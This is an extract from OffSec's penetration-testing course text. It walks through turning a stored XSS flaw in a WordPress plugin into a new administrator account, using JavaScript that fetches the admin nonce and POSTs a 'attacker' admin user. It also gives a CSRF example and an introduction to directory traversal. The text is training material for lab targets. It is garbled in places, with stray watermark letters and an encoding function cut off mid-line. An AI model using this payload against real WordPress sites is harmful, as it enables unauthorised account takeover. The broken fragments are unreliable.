Penetration Testing with Kali Linux
Figure 114: Demonstrating the XSS vulnerability
Excellent. We have injected an XSS payload into the web application’s database and it will be
served to any administrator that loads the plugin. A simple alert window is a somewhat trivial
example of what can be done with XSS, so let’s try something more interesting, like creating a
new administrative account.
8.4.5 Privilege Escalation via XSS
Since we are now capable of storing JavaScript code inside the target WordPress application and
having it executed by the admin user when loading the page, we’re ready to get more creative and
explore different avenues for obtaining administrative privileges.
We could leverage our XSS to steal cookies372 and session information if the application uses an
insecure session management configuration. If we can steal an authenticated user’s cookie, we
y
could masquerade as that user within the target web site.
Websites use cookies to track state373 and information abokut users. Cookies can be set with
several optional flags, including two that are particularly interesting to us as penetration testers:
Secure and HttpOnly.
s
The Secure374 flag instructs the browser to only send the cookie over encrypted connections,
such as HTTPS. This protects the cookie from boeing sent in clear text and captured over the
network.
The HttpOnly375 flag instructs the browser nto deny JavaScript access to the cookie. If this flag is
not set, we can use an XSS payload to steal the cookie.
i
Let’s verify the nature of WordPress’ session cookies by first logging in as the admin user.
z
Next, we can open the Web Developer Tools, navigate to the Storage tab, then click on
http://offsecwp under the Cookies menu on the left.
D
Figure 115: Inspecting WordPress Cookies
We notice that our browser has stored six different cookies, but only four are session cookies. Of
these four cookies, if we exclude the negligible wordpress_test_cookie, all support the HttpOnly
feature.
Since all the session cookies can be sent only via HTTP, unfortunately, they also cannot be
retrieved via JavaScript through our attack vector. We’ll need to find a new angle.
372 (Wikipedia, 2022), https://en.wikipedia.org/wiki/HTTP_cookie
373 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Session_(computer_science)
374 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Secure_cookie
375 (Mozilla, 2022), https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 240
Made in Morocco
Penetration Testing with Kali Linux
When the admin loads the Visitors plugin dashboards that contains the injected JavaScript, it
executes whatever we provided as a payload, be it an alert pop-up banner or a more complex
JavaScript function.
For instance, we could craft a JavaScript function that adds another WordPress administrative
account, so that once the real administrator executes our injected code, the function will execute
behind the scenes.
In order to succeed with our attack angle, we need to cover another web application attack class.
To develop this attack, we’ll build a similar scenario as depicted by Shift8.376 First, we’ll create a
JS function that fetches the WordPress admin nonce.377
The nonce is a server-generated token that is included in each HTTP request to add randomness
and prevent Cross-Site-Request-Forgery (CSRF)378 attacks.
y
A CSRF attack occurs via social engineering in which the victim clicks on a malicious link that
performs a preconfigured action on behalf of the user. k
The malicious link could be disguised by an apparently-harmless description, often luring the
victim to click on it. s
Check out
o
these awesome cat memes!
Listing 123 - CSRF example attack
n
In the above example, the URL link is pointing to a Fake Crypto Bank website API, which performs
a bitcoin transfer to the attacker account. If this link was embedded into the HTML code of an
email, the user would be only able toi see the link description, but not the actual HTTP resource it
is pointing to. This attack would bze successful if the user is already logged in with a valid session
on the same website.
D
In our case, by including and checking the pseudo-random nonce, WordPress prevents this kind
of attack, since an attacker could not have prior knowledge of the token. However, as we’ll soon
explain, the nonce won’t be an obstacle for the stored XSS vulnerability we discovered in the
plugin.
As mentioned, in order to perform any administrative action, we need to first gather the nonce.
We can accomplish this using the following JavaScript function:
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
Listing 124 - Gathering WordPress Nonce
376 (Shift8, 2022), https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/
377 (WordPress.org, 2022), https://developer.wordpress.org/reference/functions/wp_nonce_field/
378 (OWASP, 2022), https://owasp.org/www-community/attacks/csrf
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 241
Made in Morocco
Penetration Testing with Kali Linux
This function performs a new HTTP request towards the /wp-admin/user-new.php URL and
saves the nonce value found in the HTTP response based on the regular expression. The regex
pattern matches any alphanumeric value contained between the string /ser" value=" and double
quotes.
Now that we’ve dynamically retrieved the nonce, we can craft the main function responsible for
creating the new admin user.
var params = "action=createuser&_wpnonce_create-
user="+nonce+"&user_login=attacker&email=PI:EMAIL&pass1=attackerpass&pass2=
attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
y
Listing 125 - Creating a New WordPress Administrator Account
Highlighted in this function is the new backdoored admin account, just after the nonce we
k
obtained previously. If our attack succeeds, we’ll be able to gain administrative access to the
entire WordPress installation.
s
To ensure that our JavaScript payload will be handled correctly by Burp and the target application,
we need to first minify it, then encode it.
o
To minify our attack code into a one-liner, we can navigate to JS Compress.379
n
i
z
D
Figure 116: Minifying the XSS attack code
379 (JSCompress.com, 2022), https://jscompress.com/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 242
Made in Morocco
Penetration Testing with Kali Linux
Once we have clicked on Compress JavaScript, we’ll copy the output and save it locally.
As a final attack step, we are going to encode the minified JavaScript code, so any bad characters
won’t interfere with sending the payload. We can do this using the following function:
function encode_to_javascript(string) {
var input = string
var output = '';
for(pos = 0; pos ” tags, so the browser
cannot render any string from it.
D
By loading the plugin statistics, we should have executed the malicious script, so let’s verify if our
attack succeeded by clicking on the Users menu on the left pane.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 246
Made in Morocco
Penetration Testing with Kali Linux
y
k
s
o
n
i
Figure 120: Confirming that our Attack Succeeded
z
Excellent! Due to this XSS flaw, we managed to elevate our application privileges from a standard
user to administrator via a specially-crafted HTTP request.
D
We could now advance our attack and gain access to the underlying host by crafting a custom
WordPress plugin with an embedded web shell. We’ll cover web shells more in-depth in an
another Module.
8.5 Wrapping Up
In this Module, we focused on the identification and enumeration of common web application
vulnerabilities. We also exploited several common web application vulnerabilities, including API
misconfigurations and Cross-Site Scripting.
We concluded the Module by leveraging an XSS vulnerability to gain administrative privileges on a
vulnerable web application via a specially-crafted HTTP request.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 247
Made in Morocco
Penetration Testing with Kali Linux
9 Common Web Application Attacks
In this Learning Module, we will cover the following Learning Units:
• Directory Traversal
• File Inclusion Vulnerabilities
• File Upload Attack Vulnerabilities
• Command Injection
Web development is currently one of the most in-demand skills in IT.383 The combination of a
shortage of skilled web developers, time constraints in projects, and rapidly changing
technologies helps certain vulnerabilities occur repeatedly in a broad range of web applications.
y
Regardless of the underlying technology stack, several common web application vulnerabilities
can be found in a multitude of deployed applications.
k
In this Module, we cover four common web application attacks. We’ll begin with Directory
Traversal and File Inclusion attacks. Next, we’ll learn hows to abuse File Upload vulnerabilities with
executable and non-executable files. Finally, we will explore Command Injection attacks.
o
9.1 Directory Traversal
This Learning Unit covers the following Leanrning Objectives:
• Understand absolute and relative paths
i
• Learn how to exploit directory traversal vulnerabilities
z
• Use encoding for special characters
D
In this Learning Unit, we will examine Directory Traversal vulnerabilities. Before we explore how to
exploit this kind of vulnerability, we’ll need to cover relative and absolute paths. We will also use
the encoding of special characters to perform Directory Traversal attacks.
9.1.1 Absolute vs Relative Paths
In this section, we’ll learn the difference between absolute and relative paths. To successfully
exploit the vulnerabilities we’ll face later in this Module, we need to specify paths to files we want
to display, upload, include, or execute. Depending on the web application and vulnerability, we’ll
use either absolute or relative paths. It is vital for us to understand the difference between these
and how we can use them to specify file paths.
To reference an absolute path, we specify the full file system path including all subdirectories. We
can refer to an absolute path from any location in the filesystem. Absolute paths start with a
forward slash (/), specifying the root file system384 on Linux. From there, we can navigate through
the file system.
383 (Computer Science, 2021), https://www.computerscience.org/web-development/careers/web-developer/career-outlook-and-
salary/
384 (IBM, 2021), https://www.ibm.com/docs/pl/aix/7.1?topic=tree-root-file-system
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 248